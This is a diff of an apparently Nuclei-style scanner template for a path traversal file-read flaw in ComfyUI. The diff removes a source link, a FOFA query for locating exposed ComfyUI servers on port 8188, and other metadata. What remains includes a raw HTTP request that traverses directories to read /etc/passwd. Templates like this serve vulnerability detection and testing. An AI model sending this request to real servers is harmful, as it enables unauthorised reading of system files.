@@ -3,12 +3,8 @@ info:
   name: ComfyUI follow_symlinks 文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kv58gwu8kgrg8shz'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kv58gwu8kgrg8shz
-    fofa: '"ComfyUI" && title=="ComfyUI" && port="8188"'
 http:
 - raw:
   - 'GET /../../../../../../../../../../../../../../etc/passwd HTTP/1.1
